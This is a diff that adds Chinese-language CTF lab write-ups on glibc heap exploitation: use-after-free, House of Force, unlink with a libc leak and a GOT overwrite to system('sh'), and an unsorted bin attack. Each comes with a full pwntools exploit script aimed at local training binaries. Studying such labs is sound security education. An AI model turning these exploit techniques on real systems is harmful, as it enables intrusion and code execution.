@@ -15,11 +15,14 @@
 > * [lab6](#lab6)
 > * [lab7](#lab7)
 > * [lab8](#lab8)
-> * [lab9](#lab8)
-> * [lab10](#lab9)
-> * [lab11](#lab10)
-> * [lab12](#lab11)
-> * [lab13](#lab12)
+> * [lab9](#lab9)
+> * [lab10](#lab10)
+> * [lab11-1](#lab11-1)
+> * [lab11-2](#lab11-2)
+> * [lab12](#lab12)
+> * [lab13](#lab13)
+> * [lab14](#lab14)
+> * [lab15](#lab15)
 
 lab1
 ---
@@ -291,19 +294,253 @@ lab9
 lab10
 ---
 
-lab11
+Use After Free 的題目是先 F, A, U ，也就是 Free 後再 allocate 使 chunk 重複，之後再 Use
+
+這題漏洞: del_note() 中沒將 free 後的設為 null 所以會有 UAF
+
+看一下 Note 結構，大小是 8 bytes
+```
+struct note {
+        void (*printnote)();
+        char *content ;
+};
+```
+
+malloc 一個的樣子大概是
+```
++---------------------+
+| note 結構: 16 bytes |
+-----------------------
+| 	 content size     |
++---------------------+
+```
+
+所以我們可以先 malloc 兩個，注意 content size 不可以是 16 bytes
+
+再依序 free 後， malloc 一個 content size = 16 的 ，這樣就可以做 UAF
+
+控制 func ptr 指到 magic()
+
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'i386'
+r = remote('127.0.0.1', 1234)
+
+def add_note(size, content):
+	r.sendlineafter(':', str(1))
+	r.sendlineafter(':', str(size))
+	r.sendlineafter(':', content)
+
+def del_note(idx):
+	r.sendlineafter(':', str(2))
+	r.sendlineafter(':', str(idx))
+
+def print_note(idx):
+	r.sendlineafter(':', str(3))
+	r.sendlineafter(':', str(idx))
+
+magic = 0x8048986
+
+add_note(48, "a") # 0
+add_note(48, "a") # 1
+del_note(0)
+del_note(1)
+add_note(8, p32(magic))
+print_note(0)
+r.interactive()
+```
+
+
+lab11-1
 ---
+
+考 House of Force
+
+須滿足兩個條件:
+1. heap overflow 改 top chunk size
+2. 可以 malloc 任意大小
+
+利用步驟:
+1. heap overflow 將 top chunk size 改為 -1 (也就是最大)
+2. malloc(-nb) 使的top chunk 位在 target - chunk_header
+3. 再次 malloc 就可以改到 target
+
+這題漏洞在 change_item()
+
+他的size 不是使用原本的 size ，而是讓使用者重新輸入，所以有 heap overflow
+
+
+
+那這題先找一下目標
+```
+struct box{
+        void (*hello_message)();
+        void (*goodbye_message)();
+};
+```
+
+有兩個 func ptr ， goodbye_message 是結束會去呼叫的，所以可以將其設為target
+
+然後程式裡面有
+```
+void magic(){
+        int fd ;
+        char buffer[100];
+        fd = open("/home/bamboobox/flag",O_RDONLY);
+        read(fd,buffer,sizeof(buffer));
+        close(fd);
+        printf("%s",buffer);
+        exit(0);
+}
+```
+
+所以就是將 target 改為 magic() 即可
+
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'amd64'
+r = remote('127.0.0.1', 1234)
+def show():
+	r.sendlineafter(':', str(1))
+
+def add_item(length, name):
+	r.sendlineafter(':', str(2))
+	r.sendlineafter(':', str(length))
+	r.sendlineafter(':', name)
+
+def change_item(idx, length, name):
+	r.sendlineafter(':', str(3))
+	r.sendlineafter(':', str(idx))
+	r.sendlineafter(':', str(length))
+	r.sendlineafter(':', name)
+
+def remove_item(idx):
+	r.sendlineafter(':', str(4))
+	r.sendlineafter(':', str(idx))
+
+magic = 0x400d49
+add_item(0x50, "a")# 0
+change_item(0, 0x100, "a"*0x58 + p64(0xffffffffffffffff))
+add_item(-0x90, "a")
+add_item(32, flat(magic, magic))
+r.interactive()
+```
+
+
+lab11-2
+---
+
+這題考 unlink
+
+主要利用是可以把存 chunk1 的位址往前搬 0x18
+
+這樣可以對chunk0 進行修改，做info leak / 任意位址寫
+
+然後 fastbin 不會做 unlink ，所以大小不可以是 fastbin 的
+
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'amd64'
+r = remote('127.0.0.1', 1234)
+def show():
+	r.sendlineafter(':', str(1))
+
+def add_item(length, name):
+	r.sendlineafter(':', str(2))
+	r.sendlineafter(':', str(length))
+	r.sendlineafter(':', name)
+
+def change_item(idx, length, name):
+	r.sendlineafter(':', str(3))
+	r.sendlineafter(':', str(idx))
+	r.sendlineafter(':', str(length))
+	r.sendlineafter(':', name)
+
+def remove_item(idx):
+	r.sendlineafter(':', str(4))
+	r.sendlineafter(':', str(idx))
+
+chk1_addr = 0x6020d8
+atoi_got = 0x602068
+atoi_off = 0x36e80
+system_off = 0x0000000000045390
+fake = flat([0, 0x81, chk1_addr-0x18, chk1_addr-0x10]) + 'a'*0x60
+fake+= flat([0x80, 0x90])
+add_item(0x80, "a") # 0
+add_item(0x80, "a") # 1
+add_item(0x80, "a") # 1
+change_item(1, 0x100, fake)
+remove_item(2)
+change_item(1, 0x100, flat([0, atoi_got]))
+show()
+r.recvuntil('0 : ')
+libc = u64(r.recvuntil('\x7f').ljust(8, '\x00')) - atoi_off
+print "libc: ",hex(libc)
+system = libc + system_off
+change_item(0, 0x100, p64(system))
+r.sendlineafter(':', 'sh')
+r.interactive()
+```
 
 lab12
 ---
+
+這題考 fastbin dup
+
+delete 時沒有設為 null ，所以有 double free 漏洞
+
+目標是跳 magic
+
 
 lab13
 ---
 
 
 
+lab14
+---
+
+考 unsorted bin attack ，改大 magic 就好
+
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'amd64'
+r = remote('127.0.0.1', 1234)
+
+def create_heap(size, content):
+	r.sendlineafter(':', str(1))
+	r.sendlineafter(':', str(size))
+	r.sendlineafter(':', content)
+
+def edit_heap(idx, size, content):
+	r.sendlineafter(':', str(2))
+	r.sendlineafter(':', str(idx))
+	r.sendlineafter(':', str(size))
+	r.sendlineafter(':', content)
+
+def del_heap(idx):
+	r.sendlineafter(':', str(3))
+	r.sendlineafter(':', str(idx))
+
+magic = 0x6020c0
+create_heap(0x20, "a") # 0
+create_heap(0x80, "a") # 0
+create_heap(0x20, "a") # 0
+del_heap(1)
+pay = "a"*0x20 + flat([0, 0x91, 0, magic - 0x10])
+edit_heap(0, 0x100, pay)
+create_heap(0x80, "a")
+r.sendlineafter(':', str(4869))
+r.interactive()
+```
 
 
+lab15
+---
 
 
 
